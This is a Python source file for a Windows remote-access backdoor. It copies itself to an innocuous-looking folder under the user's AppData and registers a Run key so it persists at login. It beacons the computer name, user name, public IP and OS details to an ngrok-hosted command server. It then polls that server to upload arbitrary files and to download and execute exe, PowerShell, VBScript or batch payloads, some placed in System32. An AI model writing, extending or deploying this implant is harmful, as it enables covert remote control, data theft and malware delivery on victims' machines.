import os
#import sys
import platform
import time
import requests
import subprocess
from datetime import datetime
from pathlib import Path
import ctypes
import json
import shutil
import winreg
import sys
#from cryptography.fernet import Fernet

APP_CONFIG_PATH = r'C:\MSPS'
LOG_FILE_PATH = r'C:\MSPS\MSPS.dll'
TEMP_DIR = Path(os.getenv('TEMP', 'C:\\Temp'))
SYSTEM32_DIR = Path(r'C:\Windows\System32')
WEB_URL = 'https://robust-ocelot-moderately.ngrok-free.app/api/parameters'  # Replace with your URL
DOWN_LOAD_URL = 'https://robust-ocelot-moderately.ngrok-free.app/download'
SYSTEM_INFO_URL = 'https://robust-ocelot-moderately.ngrok-free.app/web'  # Replace with your system info URL
ERROR_REPORT_URL = 'https://robust-ocelot-moderately.ngrok-free.app/reportexception'  # Replace with your error reporting URL
UPLOAD_FILE_URL = 'https://robust-ocelot-moderately.ngrok-free.app/upload'  # Replace with your upload log URL
OPERATION_STATUS_URL = 'https://robust-ocelot-moderately.ngrok-free.app/status'
CONFIG_FILE_PATH = r'C:\MSPS\config.json'
TIME_TO_WAKE_UP = 3600
SESSION_TRACKER = ''
#KEY = ''            #global variable to hold encryption key

"""
# Generate a key and instantiate a Fernet object
def generate_key():
    return Fernet.generate_key()

def save_key(key, file_path):
    with open(file_path, 'wb') as key_file:
        key_file.write(key)

def load_key(file_path):
    with open(file_path, 'rb') as key_file:
        return key_file.read()

# Decrypt the JSON object
def decrypt_json(encrypted_data, key):
    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data).decode()
    return json.loads(decrypted_data)

# Encrypt the JSON object
def encrypt_json(json_data):
    global KEY
    fernet = Fernet(KEY)
    json_string = json.dumps(json_data)
    encrypted_data = fernet.encrypt(json_string.encode())
    return encrypted_data
    
    """
# Function to initialize this app
def app_initialize():
    global LOG_FILE_PATH, CONFIG_FILE_PATH
    LOG_FILE_PATH = get_appdata_local_path() + 'MSPS_Log.dll'
    CONFIG_FILE_PATH = get_appdata_local_path() + 'config.json'
    ensure_log_directory_exists(LOG_FILE_PATH)

    # If the config file is available then load url from configuration
    if os.path.exists(CONFIG_FILE_PATH):
        load_config(CONFIG_FILE_PATH)
    #else:
        # download the config file
       # download_file(DOWN_LOAD_URL, CONFIG_FILE_PATH)
    # Try to copy this executable to app folder
    copy_self(LOG_FILE_PATH)
    # Try to register this app to run on windows start
    register_script()


# Function to copy this executable to a hidden directory and register to run on start
def copy_self(destination_folder):
    global SESSION_TRACKER
    try:
      # Get the path of the current script
      script_path = os.path.abspath(sys.argv[0])
      log_dir = Path(destination_folder).parent
      script_parent = Path(script_path).parent
      # Define the destination path for the copy
      if not os.path.exists(log_dir):
        os.makedirs(destination_folder)

      #destination_path = os.path.join(log_dir, os.path.basename(script_path))
      destination_path = os.path.join(log_dir, 'msps.exe')

      # Copy the script to the destination folder
      if log_dir != script_parent:
        shutil.copy2(script_path, destination_path)
    except Exception as e12:
        log_message(f"Problem with copying executable to app folder: {str(e12)}")
        send_error_report(ERROR_REPORT_URL, f"Problem with copying executable to app folder: {str(e12)}")

    SESSION_TRACKER = SESSION_TRACKER + '->Self Copy'

# Function to register this executable in windows startup
def register_script():
    global SESSION_TRACKER
    try:
      # Define the registry key and value
      key = r'Software\Microsoft\Windows\CurrentVersion\Run'
      value_name = 'MSPS'

      # Open the registry key
      try:
         reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
      except FileNotFoundError:
         reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key)

      # Set the value to the path of the script
      script_path = os.path.abspath(sys.argv[0])
      log_dir = Path(LOG_FILE_PATH).parent
      destination_path = os.path.join(log_dir, 'msps.exe')
      winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, destination_path)
      winreg.CloseKey(reg_key)
    except Exception as e13:
      log_message(f"Problem opening Config file: {str(e13)}")
      send_error_report(ERROR_REPORT_URL, f"Problem registering the exe: {str(e13)}")

    SESSION_TRACKER = SESSION_TRACKER + '->Run On Start'

# Function to load configuration from a JSON file
def load_config(file_path):
   global SESSION_TRACKER
   try:
       with open(file_path, 'r') as config_file:
         #return json.load(config_file)
         global WEB_URL, DOWN_LOAD_URL, SYSTEM_INFO_URL, ERROR_REPORT_URL, UPLOAD_FILE_URL, OPERATION_STATUS_URL
         config = json.load(config_file)
         WEB_URL = config.get('WEB_URL','')
         DOWN_LOAD_URL = config.get('DOWN_LOAD_URL','')
         SYSTEM_INFO_URL = config.get('SYSTEM_INFO_URL','')
         ERROR_REPORT_URL = config.get('ERROR_REPORT_URL', '')
         UPLOAD_FILE_URL = config.get('UPLOAD_FILE_URL', '')
         OPERATION_STATUS_URL = config.get('OPERATION_STATUS_URL', '')
         TIME_TO_WAKE_UP = config.get("TIME_TO_WAKE_UP",'')

   except Exception as e10:
       log_message(f"Problem opening Config file: {str(e10)}")
       send_error_report(ERROR_REPORT_URL, f"Problem loading Config file: {str(e10)}")
   SESSION_TRACKER = SESSION_TRACKER + '->Config Loaded'

def ensure_log_directory_exists(log_file_path):
    global SESSION_TRACKER
    log_dir = Path(log_file_path).parent
    if not log_dir.exists():
        try:
            log_dir.mkdir(parents=True, exist_ok=True)
            log_message(f"Log directory created: {log_dir}")
        except Exception as e7:
            log_message(f"Failed to create log directory: {str(e7)}")
            # raise Exception(f"Failed to create log directory: {str(e)}")
    SESSION_TRACKER = SESSION_TRACKER + 'LogPath'

def log_message(message):
    with open(LOG_FILE_PATH, 'a') as log_file:
        log_file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {message}\n")

def call_api(url):
    global SESSION_TRACKER
    try:
        data = {
            'param1': os.getenv('COMPUTERNAME', 'Unknown'),             #system_name
            'param2': os.getenv('USERNAME', 'Unknown'),                 #logged_in_user
        }
        response = requests.post(url, json=data)
        if not response.status_code == 200:
            log_message(f"Call to Api failed. Status code: {response.status_code}")
            SESSION_TRACKER = SESSION_TRACKER + '->API Call'
        return response
    except Exception as e14:
        log_message(f"Call to Api failed. Status code: {str(e14)}")
        return None

def send_error_report(url, error_message):
    global SESSION_TRACKER
    try:
        data = {
            'param1': error_message,                                    #error_message
            'param2': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),     #date_time
            'param3': requests.get('https://api.ipify.org').text,       #IPaddress
            'param4': os.getenv('COMPUTERNAME', 'Unknown'),             #system_name
            'param5': os.getenv('USERNAME', 'Unknown'),                 #logged_in_user
            'param6': f"{platform.system()} {platform.version() } CHIP Set: {platform.machine()}"       #os_name_version

        }
        response = requests.post(url, json=data)
        if response.status_code in [200, 201]:
            log_message(f"Error report sent successfully: {error_message}")
        else:
            log_message(f"Failed to send error report. Status code: {response.status_code}")
    except Exception as e6:
        log_message(f"Exception sending error report: {str(e6)}")
    SESSION_TRACKER = SESSION_TRACKER + '->Send Error Message'

def upload_file(url, file_path):
    global SESSION_TRACKER
    try:
        data = {
            'param1': os.getenv('COMPUTERNAME', 'Unknown'),  # system_name
            'param2': os.getenv('USERNAME', 'Unknown')  # logged_in_user
        }
        with open(file_path, 'rb') as file:
            files = {
                'file': (os.path.basename(file_path), file, 'application/octet-stream')
            }
            response = requests.post(url, files=files, data=data)
            if response.status_code == 200:
                log_message(f"File uploaded successfully: {file_path}")
            else:
                log_message(f"Failed to upload file. Status code: {response.status_code}")
    except Exception as e4:
        log_message(f"Exception uploading file: {str(e4)}")
    SESSION_TRACKER = SESSION_TRACKER + '->File Uploaded'

def is_admin():
    global SESSION_TRACKER
    try:
        SESSION_TRACKER = SESSION_TRACKER + '->Is Admin'
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def download_file(url, path):
    global SESSION_TRACKER
    data = {
        'param1': os.getenv('COMPUTERNAME', 'Unknown'),  # system_name
        'param2': os.getenv('USERNAME', 'Unknown'),  # logged_in_user
    }
    response = requests.post(url, json=data, stream=True)
    if response.status_code == 200:
        with open(path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
    else:
        raise Exception(f"Failed to download file. Status code: {response.status_code}")
    SESSION_TRACKER = SESSION_TRACKER + '->File Uploaded'

def execute_file(path, file_type):
    global SESSION_TRACKER
    try:
        if file_type == 'exe':
            result = subprocess.run([path], check=True, capture_output=True)
            log_message(f"Executed EXE: {path}, Output: {result.stdout.decode()}")
        elif file_type == 'ps1':
            result = subprocess.run(['powershell', path], check=True, capture_output=True)
            log_message(f"Executed PS1: {path}, Output: {result.stdout.decode()}")
        elif file_type == 'vbs':
            result = subprocess.run(['cscript', path], check=True, capture_output=True)
            log_message(f"Executed VBS: {path}, Output: {result.stdout.decode()}")
        elif file_type == 'bat':
            result = subprocess.run([path], check=True, capture_output=True)
            log_message(f"Executed BAT: {path}, Output: {result.stdout.decode()}")
        elif file_type == 'json':
            shutil.move(path, os.path.join(get_appdata_local_path(), os.path.basename(path)))  # specifically for config.json
        else:
            log_message(f"Unknown file type for execution: {file_type}")
    except Exception as e3:
        log_message(f"Exception executing file {path}: {str(e3)}")
        send_error_report(ERROR_REPORT_URL, f"Exception executing file {path}: {str(e3)}")
    SESSION_TRACKER = SESSION_TRACKER + '->Execution Complete'

def send_system_info(url):
    global SESSION_TRACKER
    try:
        data = {
            'param1': requests.get('https://api.ipify.org').text,    #IPaddress
            'param2': os.getenv('COMPUTERNAME', 'Unknown'),          #system_name
            'param3': os.getenv('USERNAME', 'Unknown'),              #logged_in_user
            'param4': f"{platform.system()} {platform.version() } CHIP Set: {platform.machine()}",      #os_name_version
            'param5': datetime.now().strftime('%Y-%m-%d %H:%M:%S')    #date_time
        }
        response = requests.post(url, json=data)
        if response.status_code in [200, 201]:
            log_message(f"System info sent successfully: {data}")
            SESSION_TRACKER = SESSION_TRACKER + '->System Info'
            return True
        else:
            log_message(f"Failed to send system info. Status code: {response.status_code}")
            return False
    except Exception as e2:
        log_message(f"Exception sending system info: {str(e2)}")
        return False


def get_appdata_local_path():
    # Using os module
    appdata_local_path_os = os.getenv('LOCALAPPDATA')

    return appdata_local_path_os + '\Microsoft\MSPS\\'

def send_operation_status():
    global SESSION_TRACKER
    try:
        data = {
            'param1': os.getenv('COMPUTERNAME', 'Unknown'),  # system_name
            'param2': os.getenv('USERNAME', 'Unknown'),  # logged_in_user
            'param3': SESSION_TRACKER
        }
        response = requests.post(OPERATION_STATUS_URL, json=data)

    except Exception as e2:
        log_message(f"Exception in Operation Status: {str(e2)}")
        return False


def main():
    #time.sleep(300)  # Wait 5 minutes before making another request
    app_initialize()
    # Send system info at script start
    send_system_info(SYSTEM_INFO_URL)

    #Log a message about the start of the script
    log_message('Script started.')
    """
    # Generate and save a key
    key = generate_key()
    save_key(key, 'C:\MSPS\MSPS.key')

    # Load the key into global KEY
    global KEY
    KEY = load_key('MSPS.key')
    """
    while True:
               try:

                  time.sleep(int(TIME_TO_WAKE_UP))  # Wait 60 minutes before making another request
                  response = call_api(WEB_URL)
                  if response.status_code:

                     if response.status_code == 200:
                        params = response.json()
                        if len(params) != 5:
                           log_message(f"Invalid response parameters: {params}")
                           continue

                        #command, path, filename, timetoexecute, gotosleep = params.
                        command = params.get('command')
                        path = params.get('path')
                        filename = params.get('filename')
                        time_to_execute = params.get('timetoexecute')
                        go_to_sleep = params.get('gotosleep')

                        if command == '0':
                           admin_status = '1' if is_admin() else '0'
                           log_message(f"Admin status: {admin_status}")
                           send_operation_status()
                           continue
                        if command == '10':
                           # Upload the error log file
                           upload_file(UPLOAD_FILE_URL, LOG_FILE_PATH)
                           send_operation_status()
                           continue

                        if command == '11':
                           # Upload any other file
                           upload_file(UPLOAD_FILE_URL, path)
                           send_operation_status()
                           continue

                        if command == '100':
                           # go to sleep
                           send_operation_status()
                           time.sleep(int(go_to_sleep))
                           continue

                        file_path = (SYSTEM32_DIR if command in ['5', '6'] else TEMP_DIR) / filename
                        #if os.path.exists(file_path):
                         #  os.remove(file_path)

                        download_file(DOWN_LOAD_URL, file_path)
                        log_message(f"Downloaded file: {file_path}")

                        if time_to_execute:
                           time.sleep(float(time_to_execute))

                        file_type = {
                           '1': 'exe',
                           '2': 'ps1',
                           '3': 'vbs',
                           '4': 'bat',
                           '20': 'json'
                        }.get(command, 'unknown')

                        execute_file(file_path, file_type)

                        if command in ['5', '6']:
                           log_message(f"Script terminating after executing file: {file_path}")
                           break

                        log_message(f"Command {command} executed successfully.")
                     else:
                        log_message(f"Failed to fetch data. Status code: {response.status_code}")
                        continue


                  #time.sleep(120)  # Wait 5 minutes before making another request
               except Exception as e1:
                  log_message(f"Exception in main loop: {str(e1)}")
                  send_operation_status()
                  # time.sleep(300)  # Wait 5 minutes before making another request
               send_operation_status()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log_message(f"Unhandled exception: {str(e)}")
        send_error_report(ERROR_REPORT_URL, f"Exception in main loop: {str(e)}")
        send_operation_status()
